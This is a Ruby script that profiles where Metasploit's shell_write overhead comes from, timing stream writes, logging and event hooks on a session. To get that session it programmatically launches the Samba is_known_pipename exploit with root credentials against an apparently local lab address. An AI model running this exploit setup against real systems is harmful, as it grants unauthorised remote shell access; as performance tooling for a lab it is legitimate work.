#!/usr/bin/env ruby
# frozen_string_literal: true

#
# Find where the ~425ms shell_write overhead comes from
#

require 'benchmark'

def timed(name)
  result = nil
  time = Benchmark.realtime { result = yield }
  puts "  #{name}: #{(time * 1000).round(3)}ms"
  result
end

TARGET = '172.19.0.3'

puts "=" * 60
puts "FINDING SHELL_WRITE OVERHEAD"
puts "=" * 60

require 'msfenv'
require 'msf/base'

framework = Msf::Simple::Framework.create
puts "MSF loaded"

# Create session (simplified - reuse if exists)
if framework.sessions.length > 0
  session = framework.sessions.values.first
  puts "Reusing existing session: #{session.sid}"
else
  puts "Creating new session..."
  exploit = framework.exploits.create('linux/samba/is_known_pipename')
  Msf::Simple::Framework.simplify_module(exploit)
  exploit.datastore['RHOSTS'] = TARGET
  exploit.datastore['SMB_SHARE_NAME'] = 'myshare'
  exploit.datastore['SMB_USER'] = 'root'
  exploit.datastore['SMB_PASS'] = 'root'
  exploit.datastore['PAYLOAD'] = 'cmd/unix/interact'
  exploit.datastore['TARGET'] = 0

  driver = Msf::ExploitDriver.new(framework)
  driver.exploit = exploit
  driver.payload = framework.payloads.create('cmd/unix/interact')
  driver.payload.share_datastore(exploit.datastore)
  driver.target_idx = 0
  exploit.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)
  driver.payload.init_ui(nil, Rex::Ui::Text::Output::Buffer.new)

  session = driver.run
  unless session
    puts "Failed to create session"
    exit 1
  end
  puts "Created session: #{session.sid}"
end

rstream = session.rstream
puts "rstream class: #{rstream.class}"
puts "session.log_source: #{session.log_source.inspect}"

# ============================================================
# Test each component of shell_write
# ============================================================
puts "\n" + "=" * 60
puts "COMPONENT TIMING"
puts "=" * 60

buf = "echo component_test\n"

puts "\n--- 1. Pure rstream.write ---"
10.times do |i|
  timed("rstream.write ##{i+1}") { rstream.write(buf) }
end

sleep 0.2
rstream.get_once(-1, 0.1) rescue nil  # Clear buffer

puts "\n--- 2. rlog (if enabled) ---"
if session.log_source
  10.times do |i|
    timed("rlog ##{i+1}") { rlog(buf, session.log_source) }
  end
else
  puts "  log_source is nil - rlog not called"
end

puts "\n--- 3. framework.events.on_session_command ---"
10.times do |i|
  timed("on_session_command ##{i+1}") do
    framework.events.on_session_command(session, buf.strip)
  end
end

puts "\n--- 4. Full shell_write ---"
10.times do |i|
  timed("session.shell_write ##{i+1}") do
    session.shell_write("echo full#{i}\n")
  end
end

sleep 0.2
rstream.get_once(-1, 0.1) rescue nil  # Clear buffer

# ============================================================
# Check if there's something special about session.rstream
# ============================================================
puts "\n" + "=" * 60
puts "RSTREAM ANALYSIS"
puts "=" * 60

puts "\n--- Check if rstream is wrapped ---"
puts "  rstream.class: #{rstream.class}"
puts "  rstream.methods specific to it:"
(rstream.methods - Object.methods).sort.take(20).each do |m|
  puts "    #{m}"
end

puts "\n--- Check session methods that might hook writes ---"
[:write, :shell_write, :sync, :flush].each do |m|
  if rstream.respond_to?(m)
    loc = rstream.method(m).source_location rescue nil
    puts "  rstream.#{m}: #{loc ? loc.join(':') : 'built-in'}"
  end
end

# ============================================================
# Check for session ring buffer
# ============================================================
puts "\n" + "=" * 60
puts "SESSION RING BUFFER"
puts "=" * 60

if session.respond_to?(:ring) && session.ring
  puts "  Session has ring buffer: #{session.ring.class}"
  puts "  Ring size: #{session.ring.size rescue 'N/A'}"
  puts "  Ring might be intercepting I/O!"
else
  puts "  No ring buffer"
end

# ============================================================
# Trace the actual method call
# ============================================================
puts "\n" + "=" * 60
puts "METHOD TRACE"
puts "=" * 60

# Monkey-patch to trace timing
puts "\n--- Instrumenting shell_write ---"

class << session
  alias_method :original_shell_write, :shell_write

  def shell_write(buf)
    return unless buf

    times = {}

    times[:start] = Process.clock_gettime(Process::CLOCK_MONOTONIC)

    # Step 1: rlog
    if self.log_source
      rlog(buf, self.log_source)
    end
    times[:after_rlog] = Process.clock_gettime(Process::CLOCK_MONOTONIC)

    # Step 2: events
    framework.events.on_session_command(self, buf.strip)
    times[:after_events] = Process.clock_gettime(Process::CLOCK_MONOTONIC)

    # Step 3: write
    rstream.write(buf)
    times[:after_write] = Process.clock_gettime(Process::CLOCK_MONOTONIC)

    # Print timing breakdown
    rlog_time = (times[:after_rlog] - times[:start]) * 1000
    events_time = (times[:after_events] - times[:after_rlog]) * 1000
    write_time = (times[:after_write] - times[:after_events]) * 1000
    total_time = (times[:after_write] - times[:start]) * 1000

    puts "    rlog: #{rlog_time.round(3)}ms | events: #{events_time.round(3)}ms | write: #{write_time.round(3)}ms | total: #{total_time.round(3)}ms"
  end
end

5.times do |i|
  puts "  shell_write call ##{i+1}:"
  session.shell_write("echo traced#{i}\n")
end

sleep 0.2
rstream.get_once(-1, 0.1) rescue nil

# Restore original
class << session
  alias_method :shell_write, :original_shell_write
end

puts "\nDone!"
